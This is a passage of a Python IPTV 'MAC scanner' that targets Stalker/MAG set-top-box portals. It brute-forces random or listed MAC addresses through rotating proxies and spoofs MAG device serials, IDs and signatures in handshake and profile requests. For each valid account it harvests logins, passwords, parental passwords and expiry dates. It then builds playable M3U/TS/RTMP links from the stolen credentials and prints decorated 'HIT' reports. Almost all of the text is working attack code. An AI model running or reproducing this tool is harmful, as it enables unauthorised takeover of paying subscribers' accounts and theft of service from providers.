'🇷🇺Tomsk[RU]', 'Asia/Ujung_Pandang': '🇮🇩Ujung Pandang[ID]', 'Asia/Ulaanbaatar': '🇲🇳Ulaanbaatar[MN]', 'Asia/Ulan_Bator': '🇲🇳Ulan Bator[MN]', 'Asia/Urumqi': '🇨🇳Urumqi[CN]', 'Asia/Ust-Nera': '🇷🇺Ust-Nera[RU]', 'Asia/Vientiane': '🇱🇦Vientiane[LA]', 'Asia/Vladivostok': '🇷🇺Vladivostok[RU]', 'Asia/Yakutsk': '🇷🇺Yakutsk[RU]', 'Asia/Yangon': '🇲🇲Yangon[MM]', 'Asia/Yekaterinburg': '🇷🇺Yekaterinburg[RU]', 'Asia/Yerevan': '🇦🇲Yerevan[AM]', 'Atlantic/Azores': '🇵🇹Azores[PT]', 'Atlantic/Bermuda': '🇧🇲Bermuda[BM]', 'Atlantic/Canary': '🇪🇸Canary[ES]', 'Atlantic/Cape_Verde': '🇨🇻Cape Verde[CV]', 'Atlantic/Faeroe': '🇫🇴Faroe Islands[FO]', 'Atlantic/Faroe': '🇫🇴Faroe Islands[FO]', 'Atlantic/Jan_Mayen': '🇳🇴Jan Mayen[NO]', 'Atlantic/Madeira': '🇵🇹Madeira[PT]', 'Atlantic/Reykjavik': '🇮🇸Reykjavik[IS]', 'Atlantic/South_Georgia': '🇬🇸South Georgia[GS]', 'Atlantic/St_Helena': '🇸🇭St. Helena[SH]', 'Atlantic/Stanley': '🇫🇰Stanley[FK]', 'Australia/ACT': '🇦🇺Australian Capital Territory[AU]', 'Australia/Adelaide': '🇦🇺Adelaide[AU]', 'Australia/Brisbane': '🇦🇺Brisbane[AU]', 'Australia/Broken_Hill': '🇦🇺Broken Hill[AU]', 'Australia/Canberra': '🇦🇺Canberra[AU]', 'Australia/Currie': '🇦🇺Currie[AU]', 'Australia/Darwin': '🇦🇺Darwin[AU]', 'Australia/Eucla': '🇦🇺Eucla[AU]', 'Australia/Hobart': '🇦🇺Hobart[AU]', 'Australia/LHI': '🇦🇺Lord Howe Island[AU]', 'Australia/Lindeman': '🇦🇺Lindeman[AU]', 'Australia/Lord_Howe': '🇦🇺Lord Howe Island[AU]', 'Australia/Melbourne': '🇦🇺Melbourne[AU]', 'Australia/NSW': '🇦🇺New South Wales[AU]', 'Australia/North': '🇦🇺North[AU]', 'Australia/Perth': '🇦🇺Perth[AU]', 'Australia/Queensland': '🇦🇺Queensland[AU]', 'Australia/South': '🇦🇺South[AU]', 'Australia/Sydney': '🇦🇺Sydney[AU]', 'Australia/Tasmania': '🇦🇺Tasmania[AU]', 'Australia/Victoria': '🇦🇺Victoria[AU]', 'Australia/West': '🇦🇺West[AU]', 'Australia/Yancowinna': '🇦🇺Yancowinna[AU]', 'Brazil/Acre': '🇧🇷Acre[BR]', 'Brazil/DeNoronha': '🇧🇷Fernando de Noronha[BR]', 'Brazil/East': '🇧🇷Brasília[BR]', 'Brazil/West': '🇧🇷Amazônia[BR]', 'Canada/Atlantic': '🇨🇦Atlantic[CA]', 'Canada/Central': '🇨🇦Central[CA]', 'Canada/Eastern': '🇨🇦Eastern[CA]', 'Canada/Mountain': '🇨🇦Mountain[CA]', 'Canada/Newfoundland': '🇨🇦Newfoundland[CA]', 'Canada/Pacific': '🇨🇦Pacific[CA]', 'Canada/Saskatchewan': '🇨🇦Saskatchewan[CA]', 'Canada/Yukon': '🇨🇦Yukon[CA]', 'Chile/Continental': '🇨🇱Continental Chile[CL]', 'Chile/EasterIsland': '🇨🇱Easter Island[CL]', 'Cuba': '🇨🇺Cuba[CU]', 'Egypt': '🇪🇬Egypt[EG]', 'Eire': '🇮🇪Ireland[IE]', 'Europe/Amsterdam': '🇳🇱Amsterdam[NL]', 'Europe/Andorra': '🇦🇩Andorra[AD]', 'Europe/Astrakhan': '🇷🇺Astrakhan[RU]', 'Europe/Athens': '🇬🇷Athens[GR]', 'Europe/Belfast': '🇬🇧Belfast[GB]', 'Europe/Belgrade': '🇷🇸Belgrade[RS]', 'Europe/Berlin': '🇩🇪Berlin[DE]', 'Europe/Bratislava': '🇸🇰Bratislava[SK]', 'Europe/Brussels': '🇧🇪Brussels[BE]', 'Europe/Bucharest': '🇷🇴Bucharest[RO]', 'Europe/Budapest': '🇭🇺Budapest[HU]', 'Europe/Busingen': '🇩🇪Busingen[DE]', 'Europe/Chisinau': '🇲🇩Chisinau[MD]', 'Europe/Copenhagen': '🇩🇰Copenhagen[DK]', 'Europe/Dublin': '🇮🇪Dublin[IE]', 'Europe/Gibraltar': '🇬🇮Gibraltar[GI]', 'Europe/Guernsey': '🇬🇬Guernsey[GG]', 'Europe/Helsinki': '🇫🇮Helsinki[FI]', 'Europe/Isle_of_Man': '🇮🇲Isle of Man[IM]', 'Europe/Istanbul': '🇹🇷Istanbul[TR]', 'Europe/Jersey': '🇯🇪Jersey[JE]', 'Europe/Kaliningrad': '🇷🇺Kaliningrad[RU]', 'Europe/Kiev': '🇺🇦Kiev[UA]', 'Europe/Kirov': '🇷🇺Kirov[RU]', 'Europe/Kyiv': '🇺🇦Kyiv[UA]', 'Europe/Lisbon': '🇵🇹Lisbon[PT]', 'Europe/Ljubljana': '🇸🇮Ljubljana[SI]', 'Europe/London': '🇬🇧London[GB]', 'Europe/Luxembourg': '🇱🇺Luxembourg[LU]', 'Europe/Madrid': '🇪🇸Madrid[ES]', 'Europe/Malta': '🇲🇹Malta[MT]', 'Europe/Mariehamn': '🇦🇽Mariehamn[AX]', 'Europe/Minsk': '🇧🇾Minsk[BY]', 'Europe/Monaco': '🇲🇨Monaco[MC]', 'Europe/Moscow': '🇷🇺Moscow[RU]', 'Europe/Nicosia': '🇨🇾Nicosia[CY]', 'Europe/Oslo': '🇳🇴Oslo[NO]', 'Europe/Paris': '🇫🇷Paris[FR]', 'Europe/Podgorica': '🇲🇪Podgorica[ME]', 'Europe/Prague': '🇨🇿Prague[CZ]', 'Europe/Riga': '🇱🇻Riga[LV]', 'Europe/Rome': '🇮🇹Rome[IT]', 'Europe/Samara': '🇷🇺Samara[RU]', 'Europe/San_Marino': '🇸🇲San Marino[SM]', 'Europe/Sarajevo': '🇧🇦Sarajevo[BA]', 'Europe/Saratov': '🇷🇺Saratov[RU]', 'Europe/Simferopol': '🇺🇦Simferopol[UA]', 'Europe/Skopje': '🇲🇰Skopje[MK]', 'Europe/Sofia': '🇧🇬Sofia[BG]', 'Europe/Stockholm': '🇸🇪Stockholm[SE]', 'Europe/Tallinn': '🇪🇪Tallinn[EE]', 'Europe/Tirane': '🇦🇱Tirane[AL]', 'Europe/Tiraspol': '🇵🇱Tiraspol[PL]', 'Europe/Ulyanovsk': '🇷🇺Ulyanovsk[RU]', 'Europe/Uzhgorod': '🇺🇦Uzhgorod[UA]', 'Europe/Vaduz': '🇱🇮Vaduz[LI]', 'Europe/Vatican': '🇻🇦Vatican City[VA]', 'Europe/Vienna': '🇦🇹Vienna[AT]', 'Europe/Vilnius': '🇱🇹Vilnius[LT]', 'Europe/Volgograd': '🇷🇺Volgograd[RU]', 'Europe/Warsaw': '🇵🇱Warsaw[PL]', 'Europe/Zagreb': '🇭🇷Zagreb[HR]', 'Europe/Zaporozhye': '🇺🇦Zaporozhye[UA]', 'Europe/Zurich': '🇨🇭Zurich[CH]', 'GB': '🇬🇧United Kingdom[GB]', 'GB-Eire': '🇬🇧United Kingdom[GB]', 'Hongkong': '🇭🇰Hong Kong[HK]', 'Iceland': '🇮🇸Iceland[IS]', 'Indian/Antananarivo': '🇲🇬Antananarivo[MG]', 'Indian/Chagos': '🇮🇴Chagos[IO]', 'Indian/Christmas': '🇨🇽Christmas[CC]', 'Indian/Cocos': '🇨🇨Cocos[CC]', 'Indian/Comoro': '🇰🇲Comoro[KM]', 'Indian/Kerguelen': '🇹🇫Kerguelen[TF]', 'Indian/Mahe': '🇸🇨Mahe[SC]', 'Indian/Maldives': '🇲🇻Maldives[MV]', 'Indian/Mauritius': '🇲🇺Mauritius[MU]', 'Indian/Mayotte': '🇾🇹Mayotte[YT]', 'Indian/Reunion': '🇷🇪Reunion[RE]', 'Iran': '🇮🇷Iran[IR]', 'Israel': '🇮🇱Israel[IL]', 'Jamaica': '🇯🇲Jamaica[JM]', 'Japan': '🇯🇵Japan[JP]', 'Kwajalein': '🇲🇭Kwajalein[MH]', 'Libya': '🇱🇾Libya[LY]', 'Mexico/BajaNorte': '🇲🇽Baja Norte[MX]', 'Mexico/BajaSur': '🇲🇽Baja Sur[MX]', 'Mexico/General': '🇲🇽General[MX]', 'NZ': '🇳🇿New Zealand[NZ]', 'NZ-CHAT': '🇳🇿Chatham Islands[NZ]', 'Pacific/Apia': '🇼🇸Apia[WS]', 'Pacific/Auckland': '🇳🇿Auckland[NZ]', 'Pacific/Bougainville': '🇵🇬Bougainville[PG]', 'Pacific/Chatham': '🇳🇿Chatham[NZ]', 'Pacific/Chuuk': '🇫🇲Chuuk[FM]', 'Pacific/Easter': '🇨🇱Easter Island[CL]', 'Pacific/Efate': '🇻🇺Efate[VU]', 'Pacific/Enderbury': '🇰🇮Enderbury[KI]', 'Pacific/Fakaofo': '🇹🇰Fakaofo[TK]', 'Pacific/Fiji': '🇫🇯Fiji[FJ]', 'Pacific/Funafuti': '🇹🇻Funafuti[TV]', 'Pacific/Galapagos': '🇪🇨Galapagos[EC]', 'Pacific/Gambier': '🇵🇫Gambier Islands[PF]', 'Pacific/Guadalcanal': '🇸🇧Guadalcanal[SB]', 'Pacific/Guam': '🇬🇺Guam[GU]', 'Pacific/Honolulu': '🇺🇸Honolulu[US]', 'Pacific/Johnston': '🇺🇸Johnston[US]', 'Pacific/Kanton': '🇰🇮Kanton[KI]', 'Pacific/Kiritimati': '🇰🇮Kiritimati[KI]', 'Pacific/Kosrae': '🇫🇲Kosrae[FM]', 'Pacific/Kwajalein': '🇲🇭Kwajalein[MH]', 'Pacific/Majuro': '🇲🇭Majuro[MH]', 'Pacific/Marquesas': '🇵🇫Marquesas Islands[PF]', 'Pacific/Midway': '🇺🇸Midway[US]', 'Pacific/Nauru': '🇳🇷Nauru[NR]', 'Pacific/Niue': '🇳🇺Niue[NU]', 'Pacific/Norfolk': '🇳🇫Norfolk Island[NF]', 'Pacific/Noumea': '🇳🇨Noumea[NC]', 'Pacific/Pago_Pago': '🇦🇸Pago Pago[AS]', 'Pacific/Palau': '🇵🇼Palau[PW]', 'Pacific/Pitcairn': '🇵🇳Pitcairn Islands[PN]', 'Pacific/Pohnpei': '🇫🇲Pohnpei[FM]', 'Pacific/Ponape': '🇫🇲Ponape[FM]', 'Pacific/Port_Moresby': '🇵🇬Port Moresby[PG]', 'Pacific/Rarotonga': '🇨🇰Rarotonga[CK]', 'Pacific/Saipan': '🇲🇵Saipan[MP]', 'Pacific/Samoa': '🇼🇸Samoa[WS]', 'Pacific/Tahiti': '🇵🇫Tahiti[PF]', 'Pacific/Tarawa': '🇰🇮Tarawa[KI]', 'Pacific/Tongatapu': '🇹🇴Tongatapu[TO]', 'Pacific/Truk': '🇫🇲Truk[FM]', 'Pacific/Wake': '🇺🇸Wake[US]', 'Pacific/Wallis': '🇼🇫Wallis[WF]', 'Pacific/Yap': '🇫🇲Yap[FM]', 'Poland': '🇵🇱Poland[PL]', 'Portugal': '🇵🇹Portugal[PT]', 'ROC': '🇹🇼Taiwan[TW]', 'ROK': '🇰🇷South Korea[KR]', 'Singapore': '🇸🇬Singapore[SG]', 'Turkey': '🇹🇷Turkey[TR]', 'UCT': '🌐UCT', 'US/Alaska': '🇺🇸Alaska[US]', 'US/Aleutian': '🇺🇸Aleutian[US]', 'US/Arizona': '🇺🇸Arizona[US]', 'US/Central': '🇺🇸Central[US]', 'US/East-Indiana': '🇺🇸East Indiana[US]', 'US/Eastern': '🇺🇸Eastern[US]', 'US/Hawaii': '🇺🇸Hawaii[US]', 'US/Indiana-Starke': '🇺🇸Indiana-Starke[US]', 'US/Michigan': '🇺🇸Michigan[US]', 'US/Mountain': '🇺🇸Mountain[US]', 'US/Pacific': '🇺🇸Pacific[US]', 'US/Samoa': '🇺🇸Samoa[US]', 'UTC': '🌐UTC', 'Universal': '🌐Universal'}
					for key, value in replacement_dict.items():
							timezone = timezone.replace(key, value)
				except:pass
				realm = veri.split('url":')[1].split(',')[0].replace('"', "")
				port = veri.split('port":')[1].split(',')[0].replace('"', "")
				userm = veri.split('username":')[1].split(',')[0].replace('"', "")
				pasm = veri.split('password":')[1].split(',')[0].replace('"', "")
				form = ", ".join(veri.split('output_formats":')[1].split(']}')[0].replace("[","").replace('"',"").split(','))
				form = f"├㋡ ➤ 𝔸𝙻𝙻 𝔽𝙾𝚁𝙼𝙰𝚃𝚂 ☞ [{form}]"
				created = veri.split('created_at":')[1].split(',')[0].replace('"', '')
				bitism = veri.split('exp_date":')[1].split(',')[0].replace('"', "")
				try:
					message=veri.split('message":"')[1].split(',')[0].replace('"','')
					message=str(message.encode('utf-8').decode("unicode-escape")).replace('\\/','/')
				except:
					pass
				if bitism == "null" or bitism == "❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃":
					bitism = '❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃'
				else:
					try:
						bitism_date = arrow.get(int(bitism))
					except ValueError:
						bitism_date = arrow.get(bitism, "DD-MM-YYYY HH:mm:ss")
					today = arrow.now()
					days_left = abs((bitism_date - today).days)
					bitism = f'{bitism_date.format("dddd, D [de] MMMM [de] YYYY, HH:mm:ss", locale="pt_BR")} ({days_left} dias)'.lower()
				if created == "null":
					created = "├─●🔸📆 Data de criação ➤ ❃ 𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 ❃"
				else:
					created_date = arrow.get(int(created))
					created = created_date.format("dddd, D [de] MMMM [de] YYYY, HH:mm:ss", locale="pt_BR").lower()
				hostreal = realm + ':' + port
				if port not in panel:
					digitado = panel + ':' + port.replace('port', '')
				else:
					digitado = panel
				base_digitado = "http://" + digitado.replace('http://', '').replace('/c/', '')
				base_hostreal = "http://" + hostreal.replace('http://', '').replace('/c/', '')
				M3U8 = f"{base_digitado}/get.php?username={userm}&password={pasm}&type=m3u_plus&output=m3u8"
				RTMP = f"{base_hostreal}/get.php?username={userm}&password={pasm}&type=m3u_plus&output=rtmp"
				TS = f"{base_digitado}/get.php?username={userm}&password={pasm}&type=m3u_plus&output=ts"
				EPG = f"{base_hostreal}/get.php?username={userm}&password={pasm}"
				links = []
				if "m3u8" in form: links.append("├㋡ ➤ ▄▄︻デ𝕄𝟹𝚄𝟾🐉𝕃𝙸𝙽𝙺═一※ " + M3U8)
				if "ts" in form: links.append("├㋡ ➤ ▄▄︻デ𝕋𝚂🐉𝕃𝙸𝙽𝙺══一※ " + TS)
				if "rtmp" in form: links.append("├㋡ ➤ ▄▄︻デℝ𝚃𝙼𝙿🐉𝕃𝙸𝙽𝙺═一※ " + RTMP)
				if "epg" in form: links.append("├㋡ ➤ ▄▄︻デ𝔼𝙿𝙶🐉𝕃𝙸𝙽𝙺══一※ " + EPG)
				links.append("├㋡ ➤ ▄▄︻デ𝔼𝙿𝙶🐉𝕃𝙸𝙽𝙺══一※ " + EPG)
				mt = ("""⚜️🆇🅃🅁🄴🄰🄼✩🅸🄽🄵🄾⚜️
╔══ 🥷⚜𝕄𝙴𝚂𝚂𝙰𝙶𝙴⚜🥷️☞ """ + str(message) + """
├㋡ ➤ ℍ𝙾𝚂𝚃 ☞ http://""" + panel + """/c/
├㋡ ➤ ℝ𝙴𝙰𝙻 ☞ http://""" + realm + """:""" + port + """/c/
├㋡ ➤ ℙ𝙾𝚁𝚃 ☞ """ + port + """
├㋡ ➤ 𝕌𝚂𝙴𝚁𝙽𝙰𝙼𝙴 ☞ """ + userm + """
├㋡ ➤ ℙ𝙰𝚂𝚂𝚆𝙾𝚁𝙳 ☞ """ + pasm + """
├㋡ ➤ ℂ𝚁𝙴𝙰𝚃𝙴𝙳 ☞ """ + created + """
├㋡ ➤ 𝔼𝚇𝙿𝙸𝚁𝙰𝚃𝙸𝙾𝙽 ☞ """ + bitism + """
├㋡ ➤ 𝔸𝙲𝚃𝙸𝚅𝙴 ℂ𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 ☞ """ + acon + """
├㋡ ➤ 𝕄𝙰𝚇𝙸𝙼𝚄𝙼 ℂ𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 ☞ """ + mcon + """
""" + status + """
""" + timezone + """
├㋡ ➤ ℍ𝙸𝚃𝚂 𝔹𝚈 ☞ """ + nickn + """ ☜
├㋡ ➤ HɪᴛTɪᴍᴇ ☞ """ + str(time.strftime('%d/%m/%Y - %H:%M:%S')) + """
╚════════☆🥇AUTO ULTIMAX IP CLOUDFLARE🥇️✶
╔══ ⚜️💢 🅼➂🅄✩🅻🄸🄽🄺 💢⚜️
""" + form + """
""" + "\n".join(links))
	return mt
def goruntu(link,cid):
	say=0
	duru="⛔ 𝗨𝗦𝗘 𝗩𝗣𝗡 🍌"
	try:
		res = ses.get(link,  headers=hea3(), timeout=10, allow_redirects=False,stream=True)
		if res.status_code==302:
			duru="✅ 𝗔𝗟𝗟 𝗚𝗢𝗢𝗗 🍀"
	except:
			duru="⛔ 𝗨𝗦𝗘 𝗩𝗣𝗡 🍌"
	return duru
def url7(cid):
	url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)+"&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http:///ch/"+str(cid)+"&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	return str(url)
def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100",
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea
def hitecho(mac, trh):
    sound_files = ["8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect", "8d82b5_Galaga_Firing_Sound_Effect", "8d82b5_Super_Mario_Bros_1_Up_Sound_Effect", "STBMAX5"]
    sound_file = random.choice(sound_files)
    line = f"{COR(166)}{sound_file}.mp3{RESET} {COR(215)}"
    centered_line = line.center(terminal_width)
    sys.stdout.write(f"\r\n{COR(215)}⧳━─⩥⟬ {centered_line} ⟭⩤─━⧳ \n  {RESET}\n")
    sys.stdout.flush()
    time.sleep(1)
    sound = os.path.join(sounds_dir, f"{sound_file}.mp3")
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass
def unicode(fyz):
	cod=fyz.encode('utf-8').decode("unicode-escape").replace('\\/','/')
	return cod
def duzel2(veri,vr):
	data=""
	try:
		data=veri.split('"'+str(vr)+'":"')[1]
		data=data.split('"')[0]
		data=data.replace('"','')
		data=unicode(data)
	except:pass
	return str(data)
def duzelt1(veri,vr):
	data=veri.split(str(vr)+'":"')[1]
	data=data.split('"')[0]
	data=data.replace('"','')
	return str(data)
def url2(mac,random):
	macs=mac.upper()
	macs=urllib.parse.quote(macs)
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper()
	SNCUT=SNENC[:13]
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper()
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()
	SG=SNCUT+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper()
	url22=http+"://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
	    times=time.time()
	    url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp='+str(times)+'&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml'
	    if stalker_portal=="2":
	    	url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG254&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp='+str(times)+'&api_signature=263&metrics={\\\"mac\\\":\\\"'+macs+'\\\",\\\"sn\\\":\\\"'+SNCUT+'\\\",\\\"model\\\":\\\"MAG254\\\",\\\"type\\\":\\\"STB\\\",\\\"uid\\\":\\\"'+DEVENC+'\\\",\\\"random\\\":\\\"'+random+'\\\"}&JsHttpRequest=1-xml'
	    if stalker_portal=="1":
	    	url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A%200.2.18-r23-254%3B%20ImageDate%3A%20Wed%20Oct%2031%2015%3A22%3A54%20EEST%202018%3B%20PORTAL%20version%3A%205.5.0%3B%20API%20Version%3A%20JS%20API%20version%3A%20343%3B%20STB%20API%20version%3A%20146%3B%20Player%20Engine%20version%3A%200x58c&num_banks=2&sn='+SNCUT+'&client_type=STB&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=2.6-IB-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22type%22%3A%22STB%22%2C%22model%22%3A%22MAG254%22%2C%22uid%22%3A%22'+DEVENC+'%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=5ab8c9dceec64b9540bb41bc527e88658aa8c620&timestamp='+str(times)+'&api_signature=262&prehash=4cda0db2375f15f906d2b4df85fc58e05b839d79&JsHttpRequest=1-xml'
	if realblue=="real" or uzmanm=="c/portal.php":
		url22=http+"://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url22
def XD():
	global m3uvpn, m3uon, macon, macvpn, bot, hit, tokenr, hitr, respons, color, macexp, exp, cloudflare_status_str
	bot=bot+1
	for PRL in range(combouz):
		if comboc=="PRL":
			mac=randommac()
		else:
			macv=re.search(pattern,combogetir(),re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		url=http+"://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
		ses=requests.Session()
		prox=proxygetir()
		oran=round(((combosay)/(combouz)*100),2)
		echok(mac,bot,combosay,hit,oran)
		while True:
			try:
				res=ses.get(url,headers=hea1(panel,mac),proxies=prox,timeout=(3))
				respons=("** {0}**".format(res))
				respons=format(res.status_code)
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		random=""
		if not 'token":"' in veri:
			tokenr="\33[35m"
			ses.close
			res.close
			continue
		tokenr="\33[0m"
		token=duzelt1(veri,"token")
		if 'random' in veri:
			random=duzelt1(veri,"random")
		veri=""
		while True:
			try:
				res=ses.get(url2(mac,random),headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		id="null"
		ip=""
		ban = ''
		login=""
		parent_password=""
		password=""
		stb_type=""
		tariff_plan_id=""
		comment=""
		country=""
		settings_password=""
		expire_billing_date=""
		max_online=""
		expires=""
		ls=""
		try:
			id=veri.split('{"js":{"id":')[1]
			id=str(id.split(',"name')[0])
		except:pass
		try:
			ip=str(duzel2(veri,"ip"))
		except:
			pass
		try:
			expires=str(duzel2(veri,"expires"))
		except:
			pass
		if id=="null" and expires=="" and ban=="":
			continue
			ses.close
			res.close
		if uzmanm=="stalker_portal/server/load.php":
			if 'login":"' in veri:
				login=str(duzel2(veri,"login"))
				parent_password=str(duzel2(veri,"parent_password"))
				password=str(duzel2(veri,"password"))
				stb_type=str(duzel2(veri,"stb_type"))
				tariff_plan_id=str(duzel2(veri,"tariff_plan_id"))
				comment=str(duzel2(veri,"comment"))
				country=str(duzel2(veri,"country"))
				settings_password=str(duzel2(veri,"settings_password"))
				expire_billing_date=str(duzel2(veri,"expire_billing_date"))
				ls=str(duzel2(veri,"ls"))
				try:
					max_online=str(duzel2(veri,"max_online"))
				except:pass
		url=http+"://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
		veri=""
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		if veri.count('phone')==0 and veri.count('end_date')==0 and expires=="" and expire_billing_date=="":
			continue
			ses.close
			res.close
		fname=""
		tariff_plan=""
		ls=""
		trh=""
		bill=""
		if uzmanm=="stalker_portal/server/load.php":
			try:
				fname=str(duzel2(veri,"fname"))
			except:pass
			try:
			    tariff_plan=str(duzel2(veri,"tariff_plan"))
			except:
				pass
			try:
			    bill=str(duzel2(veri,"created"))
			except:
				pass
		if "phone" in veri:
			trh=str(duzel2(veri,"phone"))
		if "end_date" in veri:
			trh=str(duzel2(veri,"end_date"))
		if trh == "":
			if not expires=="":
				trh=expires
		DaysRemain = ''
		if not trh == '' and ')' not in trh:
		   try:
		       data, dias_restantes = tarih_clear(trh)
		       trh = f"{data} ({dias_restantes} dias)"
		   except:
		   	pass
		   if '!00!' in trh or ')' in trh:
		       DaysRemain = ''
		   if ', ' in trh and ':' in trh:
		      try:
		      	date = datetime.strptime(trh.strip(), '%B %d, %Y, %I:%M %p')
		      	trh = date.strftime('%d-%b-%Y')
		      except:
		      	trh = trh
		   if '-' in trh and ':' in trh:
		      try:
		      	date = datetime.strptime(trh.strip(), '%Y-%m-%d %H:%M:%S')
		      	trh = date.strftime('%d-%b-%Y')
		      except:
		      	trh = trh
		      if ':' in trh:
		      	try:
		      		trh = trh.split(' ')[0]
		      	except:
		      		pass
		   trh = trh + DaysRemain
		   trh = trh.replace(' ( Days)', '')
		if '1970' in trh or '1960' in trh or 'null' in trh:
			trh = 'Unlimited'
		if '(-' in trh or trh == '' or token == '{':
		      trh = ''
		      res.close()
		if trh == "":
			if uzmanm=="stalker_portal/server/load.php" or "xx//server/load.php":
				trh=expire_billing_date
				if not "0000-00-00 00:00:00" in trh:
					if trh < current_time:
						macexp=macexp+1
						continue
						ses.close
						res.close
		if trh:
			is_valid = check_expiry(trh, mac)
			status = "\033[1;92m✅ HIT válido" if is_valid else "\033[1;91m⚠️ HIT expirado"
			print(f"{status} - {trh} - {mac} \033[0m")
		veri=""
		cid="1842"
		url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
		bad=0
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
				veri=str(res.text)
				if 'total' in veri:
					cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				if uzmanm=="stalker_portal/server/load.php":
				     cid=(str(res.text).split('id":"')[5].split('"')[0])
				break
			except:pass
		user=""
		pas=""
		link=""
		real=panel
		if not expires=="":
			veri=""
			cmd=""
			url=http+"://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if not 'cmd' in veri:
				continue
			cmd=duzel2(veri,'cmd')
			veri=""
